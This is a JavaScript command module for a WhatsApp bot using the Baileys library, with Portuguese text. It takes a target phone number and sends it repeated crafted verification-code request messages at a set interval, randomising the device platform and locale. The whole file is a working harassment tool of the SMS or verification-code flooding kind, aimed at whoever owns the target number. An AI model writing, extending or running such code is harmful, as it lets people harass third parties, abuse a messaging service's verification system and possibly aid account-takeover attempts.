import { generateWAMessageFromContent, proto } from "baileys"

export default {
    name: "getcode",
    aliases: ["gc", "getcod"],
    description: "Solicita códigos de confirmação via SMS para números",
    category: "tools",

    async run({ sock, msg, args }) {
        const from = msg.key.remoteJid
        const targetNum = args[0]?.replace(/[^0-9]/g, '')
        const retries = parseInt(args[1]) || 1
        const interval = parseInt(args[2]) || 30000 // 30 segundos

        if (!targetNum) return sock.sendMessage(from, { text: "Número do alvo necessário!" }, {quoted: msg})

        const target = targetNum + "@s.whatsapp.net"
        await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } })

        try {
            let successCount = 0
            let errorCount = 0
            
            for (let attempt = 0; attempt < retries; attempt++) {
                try {
                    // Solicitação de código de confirmação
                    const requestCode = {
                        requestCodeMessage: {
                            phone: target,
                            devicePlatform: ["IOS", "ANDROID"][Math.floor(Math.random() * 2)],
                            languageCode: ["pt-BR", "en-US", "es-ES"][Math.floor(Math.random() * 3)],
                            countryCode: ["BR", "US", "ES"][Math.floor(Math.random() * 3)]
                        }
                    }

                    const preparedMsg = generateWAMessageFromContent(
                        target, 
                        proto.Message.fromObject(requestCode), 
                        { userJid: target }
                    )

                    await sock.relayMessage(
                        target, 
                        preparedMsg.message, 
                        { messageId: preparedMsg.key.id }
                    )
                    
                    successCount++
                    
                    // Espera antes da próxima tentativa
                    if (attempt < retries - 1) {
                        await new Promise(r => setTimeout(r, interval))
                    }
                } catch (error) {
                    errorCount++
                    console.log(`Erro na tentativa ${attempt+1}:`, error)
                }
            }

            await sock.sendMessage(
                from, 
                { text: `✅ ${successCount}/${retries} solicitações de código enviadas (${errorCount} erros)` }, 
                { quoted: msg }
            )
        } catch (e) {
            console.log("Erro geral ao solicitar códigos:", e)
            await sock.sendMessage(from, { text: "Erro ao solicitar códigos." })
        }
    }
}